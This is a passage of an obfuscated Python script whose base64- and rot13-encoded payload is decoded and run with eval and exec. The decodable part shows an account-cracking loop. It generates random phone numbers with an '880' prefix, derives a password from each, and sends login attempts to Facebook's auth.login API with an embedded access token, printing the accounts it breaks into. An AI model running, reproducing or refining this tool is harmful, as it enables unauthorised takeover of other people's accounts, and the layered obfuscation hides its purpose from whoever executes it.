bnVlCgkJZWxzZToKCQkJcHJpbnQoIltjaGVja3BvaW50XVx0KyIrdXNlcjEsIiB8ICIscGFzMSkKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCgpkZWYgaGkyMCgpOgoJZm9yIGkgaW4gcmFuZ2UoMTAwKToKCQl1cj1yYW5kb20ucmFuZGludCgxMTExMTExLDk5OTk5OTkpCgkJdXNyPXN0cih1cikKCQl1c2VyMT1zdHIoJzg4MCcrY29kZSt1c3IpCgkJcGFzMT1zdHIodXNlcjFbNzoxM10pCgkJCgkJZz1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MSZlbWFpbD0nK3VzZXIxKycmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScrcGFzMSsnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk4ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWZtJykudGV4dAoJCSMJcHJpbnQodXNlcgoJCSMJcHJpbnQocGFzKQoJCXk9c3RyK'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))